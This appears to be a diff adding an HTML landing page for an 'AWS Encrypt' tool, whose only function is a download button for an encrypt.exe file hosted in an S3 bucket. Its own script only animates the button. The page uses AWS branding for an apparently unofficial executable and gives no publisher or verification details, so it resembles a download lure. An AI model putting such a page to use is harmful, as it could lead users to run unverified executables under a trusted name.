@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AWS Encryption</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            overflow: hidden;
+            padding: 20px;
+        }
+        header {
+            background: #35424a;
+            color: #ffffff;
+            padding-top: 30px;
+            min-height: 70px;
+            border-bottom: #e8491d 3px solid;
+        }
+        header h1 {
+            margin: 0;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+        .content {
+            background: #ffffff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .download-section {
+            margin-top: 20px;
+        }
+        .download-btn {
+            display: inline-block;
+            background-color: #e8491d;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        .download-btn:hover {
+            background-color: #c13a1b;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Welcome to AWS Encrypt - Automate encryption in AWS.</h1>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="content">
+            <p>Encrypt your AWS resources with this tool. Use the download button to get the latest version of the tool.</p>
+            <div class="download-section">
+                <p>Click the button below to access your download:</p>
+                <a href="https://aws-encrypt-packages.s3.amazonaws.com/encrypt.exe" class="download-btn" id="downloadBtn">Download Now</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Button hover effect
+        document.getElementById('downloadBtn').onmouseover = function() {
+            this.style.transform = 'scale(1.05)';
+        }
+        document.getElementById('downloadBtn').onmouseout = function() {
+            this.style.transform = 'scale(1)';
+        }
+    </script>
+</body>
+</html>
